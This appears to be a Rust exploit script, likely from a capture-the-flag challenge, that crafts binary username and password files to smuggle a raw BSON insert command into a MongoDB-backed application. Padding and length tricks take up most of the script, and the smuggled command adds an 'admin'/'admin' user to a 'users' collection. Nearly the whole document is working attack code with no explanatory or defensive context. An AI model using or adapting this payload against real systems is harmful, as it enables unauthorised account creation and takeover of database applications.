use mongodb::{bson::doc, Client, options::ClientOptions, Collection}; 
use mongodb::error::Result; 
use mongodb::bson::Document; 
use tokio::fs; 
#[tokio::main] 
async fn main() -> Result<()> { 
    // Username payload construction (Nop-Sled + BSON header start)
    let mut username_padding: String = "a".repeat(30).to_string(); 
    let real_nop_slide_1 = format!("{}{}", "\x7e\x7e\x7e", "\x00".repeat(0x7e7e7b)).repeat(70); 
    let real_nop_slide_2 = format!("{}{}", "\x2a\x69\x69", "\x00".repeat(0x696927)); 
    let last_nop_slide = format!("{}{}", "\x21", "\x00".repeat(0x20)); 
    let username = "\x6c\x00\x00\x00\x00"; 
    
    username_padding.push_str(&real_nop_slide_1); 
    username_padding.push_str(&real_nop_slide_2); 
    username_padding.push_str(&last_nop_slide); 
    username_padding.push_str(&username); 
    
    // Password payload construction (Remaining BSON insert command)
    let mut custom_char: String = "\x07".to_owned(); 
    // Payload length determined to align the \xdd byte correctly (0xdd000000 - 2 - 94)
    let payload: String = "a".repeat(0xdd000000-2-94); 
    
    // Malicious BSON insert command snippet
    let mut message: String = "\x00\x00\x00\x00\x00\x00\x00W\x00\x00\x00\x02insert\x00\x06\x00\x00\x00users\x00\x04documents\x00'\x00\x00\x00\x030\x00\x1f\x00\x00\x00\x02u\x00\x06\x00\x00\x00admin\x00\x02p\x00\x06\x00\x00\x00admin\x00\x00\x00\x02$db\x00\x05\x00\x00\x00mydb\x00\x00".to_string(); 
    
    message.push_str(&payload); 
    custom_char.push_str(&message); 

    // Write binary data to files
    fs::write("username.bin", &username_padding).await.expect("Unable to write username file"); 
    fs::write("password.bin", &custom_char).await.expect("Unable to write password file"); 
    
    Ok(()) 
}